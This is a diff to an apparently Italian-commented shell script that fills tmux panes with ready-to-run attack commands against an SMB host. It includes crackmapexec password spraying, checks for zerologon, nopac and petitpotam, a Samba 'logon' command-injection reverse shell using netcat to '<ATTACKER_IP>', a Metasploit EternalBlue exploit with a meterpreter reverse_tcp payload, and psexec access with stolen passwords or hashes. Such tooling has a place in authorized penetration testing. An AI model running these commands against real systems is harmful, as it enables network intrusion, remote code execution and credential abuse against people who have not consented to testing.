@@ -2290,7 +2290,7 @@ tmux send-keys -t PT:22.0 "netexec smb $ip -u users.txt -p passwords.txt --conti
 tmux send-keys -t PT:22.1 "# SMB Credential Verification" Enter
 tmux send-keys -t PT:22.1 "crackmapexec smb $ip -u users.txt -p passwords.txt --continue-on-success && echo "" &&  crackmapexec smb $ip -u users.txt -p users.txt --no-bruteforce --continue-on-success && echo "" && crackmapexec smb $ip -u 'dontknow' -p '' --no-bruteforce --continue-on-success && echo "" && crackmapexec smb $ip -u '' -p '' --no-bruteforce --continue-on-success"
 tmux send-keys -t PT:22.2 "# SMB Credential Verification" Enter
-tmux send-keys -t PT:22.2 "msfconsole -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $ip ; set USER_FILE users.txt ; set PASS_FILE passwords.txt ; set DOMAIN $domain ; run""
+tmux send-keys -t PT:22.2 "msfconsole -x \"use auxiliary/scanner/smb/smb_login; set RHOSTS $ip ; set USER_FILE users.txt ; set PASS_FILE passwords.txt ; set DOMAIN $domain ; run\""
 tmux send-keys -t PT:22.3 "# SMB Reset Password" Enter
 tmux send-keys -t PT:22.3 "smbpasswd -U <USER> -r $ip"
 tmux send-keys -t PT:22.4 "# SMB Reset Password" Enter
@@ -2361,10 +2361,28 @@ tmux split-window -h -t "24.8"
 # Esecuzione dei comandi nelle sottofinestre
 tmux send-keys -t PT:24.0 "# SMB Execute Command" Enter
 tmux send-keys -t PT:24.0 "crackmapexec smb $ip -u 'USER' -p 'PASS'  –x <command>"
-tmux send-keys -t PT:24.0 "# SMB Execute Command" Enter
-tmux send-keys -t PT:24.0 "crackmapexec smb $ip -u 'USER' -p 'PASS'  –x <command> --force-ps32"
-tmux send-keys -t PT:24.0 "# SMB Known Vulnerabilities" Enter
-tmux send-keys -t PT:24.0 "crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M zerologon && crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M nopac && crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M petitpotam && crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M shadowcoerce && crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M dfscoerce"
+tmux send-keys -t PT:24.1 "# SMB Execute Command" Enter
+tmux send-keys -t PT:24.1 "crackmapexec smb $ip -u 'USER' -p 'PASS'  –x <command> --force-ps32"
+tmux send-keys -t PT:24.2 "# SMB Known Vulnerabilities" Enter
+tmux send-keys -t PT:24.2 "crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M zerologon && crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M nopac && crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M petitpotam && crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M shadowcoerce && crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M dfscoerce"
+tmux send-keys -t PT:24.3 "# SMB Activate Reverse Shell with smbclient" Enter
+tmux send-keys -t PT:24.3 "nc -nlvp 9001"
+tmux send-keys -t PT:24.4 "printf \"\n# SMB Activate Reverse Shell with smbclient\n# after smbclient connect try this command:\nsmb> logon \"/=nc '<ATTACKER_IP>' 9001 -e /bin/bash\" \" " Enter
+tmux send-keys -t PT:24.4 "smbclient -U "username%password" //$ip/sharename"
+tmux send-keys -t PT:24.5 "# SMB Activate Reverse Shell with msfconsole" Enter
+tmux send-keys -t PT:24.5 "msfconsole -x \"use auxiliary/admin/smb/samba_symlink_traversal; set rhosts $ip; set smbshare tmp; run\""
+tmux send-keys -t PT:24.6 "# SMB Activate Reverse Shell with EternalBlue" Enter
+tmux send-keys -t PT:24.6 "nmap -p 445 --script smb-vuln-ms17-010 -Pn -n $ip"
+tmux send-keys -t PT:24.7 "# SMB Activate Reverse Shell with EternalBlue" Enter
+tmux send-keys -t PT:24.7 "sudo msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $ip; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <ATTACKER_IP>; exploit\""
+tmux send-keys -t PT:24.8 "printf \"\n# SMB Activate Reverse Shell with CRedentials\n# I can get the same results with the following tools that use the same notation as psexec: smbexec, dcomexec, crackmapexec \" " Enter
+tmux send-keys -t PT:24.8 "python /usr/share/doc/python3-impacket/examples/psexec.py USER@$ip"
+tmux send-keys -t PT:24.9 "printf \"\n# SMB Activate Reverse Shell with CRedentials\n# I can get the same results with the following tools that use the same notation as psexec: smbexec, dcomexec, crackmapexec \" " Enter
+tmux send-keys -t PT:24.9 "python /usr/share/doc/python3-impacket/examples/psexec.py -hashes d9…dff:d9…dff USER@$ip"
+tmux send-keys -t PT:24.10 "printf \"\n# SMB Activate Reverse Shell with CRedentials\n# I can get the same results with the following tools that use the same notation as psexec: smbexec, dcomexec, crackmapexec \" " Enter
+tmux send-keys -t PT:24.10 "python psexec.py <username>:<pass>@$ip whoami"
+tmux send-keys -t PT:24.11 "printf \"\n# SMB Activate Reverse Shell with CRedentials\n# I can get the same results with the following tools that use the same notation as psexec: smbexec, dcomexec, crackmapexec \" " Enter
+tmux send-keys -t PT:24.11 ""
 cd $folderProject
 
 # Attivazione della modalità interattiva
